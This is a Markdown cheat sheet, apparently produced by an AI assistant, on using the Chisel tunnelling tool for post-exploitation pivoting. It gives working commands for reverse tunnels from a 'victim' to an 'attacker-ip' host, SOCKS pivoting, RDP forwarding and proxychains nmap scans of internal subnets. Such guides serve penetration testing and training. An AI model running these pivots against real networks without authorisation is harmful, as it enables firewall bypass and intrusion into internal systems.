

---



## 📌 **1. Overview**

**Chisel** is a fast TCP/UDP tunnel tool written in Go.  
You can use it for:

- Port forwarding
    
- SOCKS proxy
    
- Reverse tunnels (bypass firewalls)
    
- Pivoting inside restricted networks
    

---

# 🚀 **2. Basic Syntax**

### **Server**

```bash
chisel server --port <PORT> [--reverse]
```

### **Client**

```bash
chisel client <SERVER_IP:PORT> <MODE> <ARGS>
```

---

# 🔥 **3. Common Modes**

| Mode                   | Purpose                                 |
| ---------------------- | --------------------------------------- |
| `socks`                | Create a SOCKS5 proxy for full pivoting |
| `R:<LOCAL>:<REMOTE>`   | Reverse port forward                    |
| `<LOCAL>:<REMOTE>`     | Forward port                            |
| `udp:<LOCAL>:<REMOTE>` | UDP port forwarding                     |

---

# 🧩 **4. Tunnelling Basics**

### **A. Local Port Forwarding**

Forward attacker port → target internal service.

```bash
chisel client <server:port> 8000:127.0.0.1:80
```

Meaning:  
Attacker visits **localhost:8000**, you access victim’s **127.0.0.1:80**.

---

### **B. Reverse Port Forwarding**

Used when attacker **cannot reach victim**, but victim can reach attacker.

**Server must run with `--reverse`:**

```bash
chisel server --port 9001 --reverse
```

**Client on victim:**

```bash
chisel client <attacker-ip:9001> R:8000:127.0.0.1:80
```

Meaning:  
Victim exposes its internal **127.0.0.1:80** to attacker on **attacker:8000**.

---

### **C. SOCKS Pivoting**

Use when you want full internal network pivoting.

**Server (attacker):**

```bash
chisel server --port 9999 --reverse
```

**Client (victim):**

```bash
chisel client <attacker-ip:9999> R:socks
```

OR (classic forward):

```bash
chisel server --port 9999
chisel client <server-ip:9999> socks
```

Your proxy will be:

```
SOCKS5 → 127.0.0.1:1080
```

Use with:

```
proxychains <tool>
```

or  
Configure Burp Suite SOCKS5.

---

# 🔄 **5. Multiple Forwards**

You can chain multiple forwards in one command:

```bash
chisel client <server:port> 8001:10.0.0.5:445 8002:10.0.0.7:3389 9000:socks
```

---

# 📡 **6. UDP Tunnelling**

Forward UDP traffic:

```bash
chisel client <server:port> udp:5353:192.168.1.10:53
```

---

# 🚧 **7. Authentication**

### **Server with password**

```bash
chisel server --port 9000 --auth mypass
```

### **Client**

```bash
chisel client --auth mypass <server:9000> 8000:localhost:80
```

---

# 🔐 **8. Encryption**

Chisel uses SSH-like encrypted tunnels by default.  
No extra flags needed.

---

# 🗂️ **9. Real-World Attack Scenarios**

---

## 🎯 **Scenario 1 — Pivot to Internal Web Server**

Victim → can reach attacker.  
Attacker cannot reach internal server.

**Attacker:**

```bash
chisel server --port 9999 --reverse
```

**Victim:**

```bash
chisel client attacker-ip:9999 R:8000:10.0.0.5:80
```

Open:

```
http://localhost:8000
```

---

## 🎯 **Scenario 2 — WinRM/RDP Pivot**

Forward internal RDP port:

```bash
chisel client <server:port> 3389:10.0.0.10:3389
```

Then:

```
xfreerdp /v:127.0.0.1
```

---

## 🎯 **Scenario 3 — SOCKS Pivot to Enumerate Internal Subnets**

**Victim:**

```bash
chisel client attacker-ip:9999 R:socks
```

**Use proxychains:**

```
proxychains nmap -sT -Pn 10.0.0.0/24
```

---

# 📝 **10. Quick Command Reference**

### **Start server**

```bash
chisel server --port 8000
```

### **Start reverse server**

```bash
chisel server --port 8000 --reverse
```

### **Forward 8080 → internal 80**

```bash
chisel client <server:8000> 8080:127.0.0.1:80
```

### **Reverse forward**

```bash
chisel client <server:8000> R:8080:127.0.0.1:80
```

### **SOCKS proxy**

```bash
chisel client <server:8000> socks
```

### **UDP tunnel**

```bash
chisel client <server:8000> udp:9999:10.0.0.50:53
```

---

# 🧠 **11. Mind Map (Text Format)**

```
Chisel
├── Server
│   ├── normal (--port)
│   └── reverse (--reverse)
│
├── Client
│   ├── Forward (LPORT:TARGET:TPORT)
│   ├── Reverse (R:LPORT:TARGET:TPORT)
│   ├── Socks proxy
│   └── UDP forwarding
│
├── Usage
│   ├── Pivoting
│   ├── Internal service enumeration
│   ├── Tunnel SMB, RDP, WinRM
│   └── Full network access (SOCKS)
│
└── Security
    ├── --auth
    └── encrypted by default
```

---

If you want, I can also generate:

✅ A **colored Obsidian-ready version** (with collapsible sections)  
✅ A **PDF version**  
✅ A combined **Chisel + Ligolo + SSH tunnelling** mega-cheat-sheet

Just tell me!